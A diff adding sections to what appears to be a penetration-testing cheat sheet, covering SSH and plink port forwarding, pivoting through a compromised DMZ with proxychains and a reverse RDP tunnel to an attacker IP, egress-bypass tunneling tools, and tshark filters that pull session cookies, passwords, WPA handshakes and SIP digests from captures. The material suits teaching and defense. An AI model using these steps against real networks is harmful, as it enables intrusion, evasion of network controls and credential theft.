@@ -129,6 +129,166 @@
     openvas-setup
     https://ip:9392
     ```
+
+## Port Forwarding / Tunneling
+
+```bash
+Local:   ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
+Remote:  ssh <gateway> -R <remote port to bind>:<local host>:<local port>
+Dynamic: ssh <gateway> -D <port to bind>
+
+Local:   plink.exe <gateway> -L <local port to listen>:<remote host>:<remote port>
+Remote:  plink.exe <gateway> -R <remote port to bind>:<local host>:<local port>
+Dynamic: plink.exe <gateway> -D <port to bind>
+```
+
+### Local Port Forwarding
+
+![](_assets/2020-05-03-10-15-54.png)
+> <https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot>
+
+```bash
+ssh -L <local-port-to-listen>:<remote-host>:<remote-port> <gateway>
+```
+
+Allow connections to a specific blocked server. From work login to home and use it as a gateway to access `banned-site.com:80`:
+
+```bash
+ssh -L 9001:banned-site.com:80 user@home #work
+curl http://localhost:9001 #home
+```
+
+![](https://chamibuddhika.files.wordpress.com/2012/03/localportforwarding.jpg)
+
+```bash
+ssh -L 9001:banned:22 user@home
+ssh -p 9001 localhost
+```
+
+![](https://chamibuddhika.files.wordpress.com/2012/03/sshsessionforwarding.jpg)
+
+Allow remote connections to local port forwards (listening on all interfaces)
+
+```bash
+ssh -L 9001:banned:22 user@home -g
+ssh -p 9001 work_machine #remotely
+```
+
+Access a port on your server which can only be accessed from localhost and not remotely. Server acts as the gateway and binds server's port 5432 to local port 9000.
+
+```bash
+ssh -L 9000:localhost:5432 user@server
+psql -h localhost -p 9000
+```
+
+### Remote Port Forwarding
+
+![](_assets/2020-05-03-10-16-13.png)
+> <https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot>
+
+Allow remote access to restricted network. 
+
+Server will bind port 9001 on `home` machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to `localhost:9001` in `home` will forward user to intra:22
+
+```bash
+ssh -R 9001:intra-ssh-server:22 user@home #work
+ssh -p 9001 localhost #home
+```
+
+![](https://chamibuddhika.files.wordpress.com/2012/03/remoteportforwarding.jpg)
+
+Add `GatewayPorts yes` to `sshd_config` to listening on all interfaces.
+
+Allow public access to a local resource through a public server.
+
+```bash
+ssh -R 9000:localhost:3000 user@public_sever
+```
+```bash
+sudo vim /etc/ssh/sshd_config
+GatewayPorts yes
+sudo service ssh restart
+```
+
+### Dynamic port forwarding
+
+One local port for tunneling data to all remote destinations (SOCKS protocol)
+
+```bash
+ssh -D 9001 home
+```
+
+![](https://chamibuddhika.files.wordpress.com/2012/03/dynamicportforwarding.jpg)
+
+
+
+### Quick Reference
+
+- Monitoring Tunnels: `netstat -tunelp`
+- Avoid TTL: `-nNT`
+- Creating reverse SSH client to tunnel-out remote desktop port
+  - FROM remote non-routable machine
+    ```bash
+    pling -l root -pw password attacker-ip -R 3390:127.0.0.1:3389  
+    # localhost 3389 to attacker ip 3389
+    ```
+  - FROM attacker's machine
+    ```bash
+    rdesktop localhost:3390
+    ```
+- SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs)
+  - Create local SOCS4 proxy: From attacker's machine (compromised DMZ)
+    ```bash
+    ssh -D 8080 root@DMZ-IP
+
+    netstat -antp | grep 8080
+
+    /etc/proxychains.conf
+    socks4 127.0.0.1 8080
+    proxychains nmap -p 3389 -ST -Pn non-routable-remote-ip-range --oepn
+
+    proxychains rdesktop rdp-ip-in-non-routable-range
+    ```
+
+**Tools**
+
+- rinetd
+  - When outbound only 80 / 443 use port forwarding (ip1:80 will proxy for ip2:3389)
+    ```
+    nano /etc/rinetd.conf
+    ip1 80 ip2 3389
+    ```
+    ```
+    bindaddress bindport connectaddress connectport
+    ```  
+- XFLTReaT tunnelling framework: <https://github.com/earthquake/XFLTReaT>
+    ```
+    TCP
+    UDP
+    ICMP
+    SOCKS v4, 4a, 5
+    HTTP CONNECT
+    SCTP (by Darren Martyn @info_dox)
+    WebSocket
+    DNS (A/CNAME, PRIVATE, NULL) - Proof of Concept
+    RDP (Windows only)
+    ```
+- <https://github.com/sshuttle/sshuttle>
+- <https://github.com/klsecservices/rpivot>
+- <https://github.com/wolfSSL/wolfssh>
+- <https://github.com/jpillora/chisel>
+
+**References**
+
+- <https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot>
+- <https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/>
+- <http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html>
+- <https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html>
+
+**New References**
+
+- <https://vimeo.com/54505525>
+
 ## Tools
 
 - Inject code and spy on wifi users: <https://github.com/DanMcInerney/LANs.py>
@@ -266,7 +426,61 @@
     tcpdump -i eth1  -s 0 port not 22 and port not 53
     tcpdump -i eth1 port not 22 and host 1.2.3.4
     ```
-    
+
+#### TSHark
+
+- General
+  - Supported network interfaces: `tshark -D`
+  - Sniff on eth0: `tshark -i eth0`
+  - Open `pcap`: `tshark -r HTTP_traffic.pcap`
+  - Read 100 packets from `pcap`: `tshark -r HTTP_traffic.pcap -c 100`
+  - Print full details for first 10 Packets: `tshark -r HTTP_traffic.pcap -c 10 -V`
+  - List of protocols in `pcap`: `tshark -r HTTP_traffic.pcap -z io,phs -q`
+  - Export into PDML: `tshark -r HTTP_traffic.pcap  -T pdml > http.xml`
+  - PDML to HTML: `xsltproc /usr/share/wireshark/pdml2html.xsl http.xml > http.html`
+- HTTP
+  - Only the HTTP traffic: `tshark -Y 'http' -r HTTP_traffic.pcap`
+  - IP packets sent from IP address 192.168.252.128 to 52.32.74.91?: `tshark -r HTTP_traffic.pcap -Y "ip.src==192.168.252.128 && ip.dst==52.32.74.91"`
+  - Packets containing GET requests: `tshark -r HTTP_traffic.pcap -Y "http.request.method==GET"`
+  - Print only source IP and URL for all GET request packets: `tshark -r HTTP_traffic.pcap -Y "http.request.method==GET" -Tfields -e frame.time -e ip.src -e http.request.full_uri`
+  - Packets contain the "password" string: `tshark -r HTTP_traffic.pcap -Y "http contains password”`
+  - Destination IP for GET requests sent to New York Times (www.nytimes.com): `tshark -r HTTP_traffic.pcap -Y "http.request.method==GET && http.host==www.nytimes.com" -Tfields -e ip.dst`
+  - Session ID being used by 192.168.252.128 for Amazon India store (amazon.in)?: `tshark -r HTTP_traffic.pcap -Y "ip contains amazon.in && ip.src==192.168.252.128" -Tfields -e ip.src -e http.cookie`
+  - Type of OS 192.168.252.128 is using: `tshark -r HTTP_traffic.pcap -Y "ip.src==192.168.252.128 && http" -Tfields -e http.user_agent`
+- HTTPS
+  - Only show SSL traffic?: `tshark -r HTTPS_traffic.pcap -Y 'ssl'`
+  - Only print the source IP and destination IP for all SSL handshake packets: `tshark -r HTTPS_traffic.pcap -Y "ssl.handshake" -Tfields -e ip.src -e ip.dst`
+  - List issuer name for all SSL certificates exchanged: `tshark -r HTTPS_traffic.pcap -Y "ssl.handshake.certificate" -Tfields -e x509sat.printableString`
+  - Print the IP addresses of all servers accessed over SSL: `tshark -r HTTPS_traffic.pcap -Y "ssl && ssl.handshake.type==1" -Tfields -e ip.dst`
+  - IP addresses associated with Ask Ubuntu servers (askubuntu.com): `tshark -r HTTPS_traffic.pcap -Y "ip contains askubuntu"`
+  - The IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com)
+  `tshark -r HTTPS_traffic.pcap -Y "ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69" -Tfields -e ip.src`
+  - What DNS servers were used: `tshark -r HTTPS_traffic.pcap -Y "dns && dns.flags.response==0" -Tfields -e ip.dst`
+  - Name of the antivirus solution: `tshark -r HTTPS_traffic.pcap -Y "ip contains avast" -Tfields -e ip.src`
+- WiFi
+  - Show only WiFi traffic: `tshark -r WiFi_traffic.pcap -Y "wlan"`
+  - View the deauthentication packets: `tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==0x000c"`
+  - Display WPA handshake packets: `tshark -r WiFi_traffic.pcap -Y "eapol"`
+  - Print the SSID and BSSID values for all beacon frames: `tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==8" -Tfields -e wlan.ssid -e wlan.bssid`
+  - What is BSSID of SSID "LazyArtists": `tshark -r WiFi_traffic.pcap -Y "wlan.ssid==LazyArtists" -Tfields -e wlan.bssid`
+  - Channel of SSID "Home_Network": `tshark -r WiFi_traffic.pcap -Y "wlan.ssid==Home_Network" -Tfields -e wlan_radio.channel`
+  - Devices that received deauth messages: `tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==0x000c" -Tfields -e wlan.ra`
+  - Which device does MAC 5c:51:88:31:a0:3b belongs to: `tshark -r WiFi_traffic.pcap -Y "wlan.ta==5c:51:88:31:a0:3b && http" -Tfields -e http.user_agent`
+  - Beacon frames present: `tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008'`
+  - Unique list of all AP BSSIDs: `tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.bssid | sort  | uniq`
+  - Unique list of all AP SSIDs: `tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.ssid | sort  | uniq`
+  - Only non-null SSIDs: `tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008 && !(wlan.tag.length ==0)' -T fields -e wlan.ssid | sort  | uniq`
+  - Unique list of SSID and BSSIDs side by side for all AP networks: `tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype == 0x0008' -T fields -e wlan.ssid -e wlan.bssid | sort  | uniq`
+- VoIP
+  - Show VoIP traffic: `tshark -r VoIP_traffic.pcap -Y "sip or rtp"`
+  - Print all REGISTER packets: `tshark -r VoIP_traffic.pcap -Y "sip.Method==REGISTER"`
+  - Only print the source IP, sender extension and authorization digest response for REGISTER packets: `tshark -r VoIP_traffic.pcap -Y "sip.Method==REGISTER" -Tfields -e ip.src -e sip.from.user -e sip.auth.digest.response`
+  - Print all codecs being used by RTP protocol: `tshark -r VoIP_traffic.pcap -Y "sdp" -Tfields -e sdp.media`
+  - User who is using the Zoiper VoIP client: `tshark -r VoIP_traffic.pcap -Y "sip contains Zoiper" -Tfields -e ip.src`
+  - IP address of the SIP server used to place calls: `tshark -r VoIP_traffic.pcap -Y "sip.Method==REGISTER" -Tfields -e ip.dst`
+  - Content of the text message sent to +918108591527?: `tshark -r VoIP_traffic.pcap -Y "sip.Method == MESSAGE" -V             (Read the content)`
+  - Extensions completed a call successfully: `tshark -r VoIP_traffic.pcap -Y "sip.Method==BYE" -Tfields -e sip.from.user -e sip.to.user`
+
 ## Defense 
 
 - Phishing Blacklist: <https://www.phishing.army/>
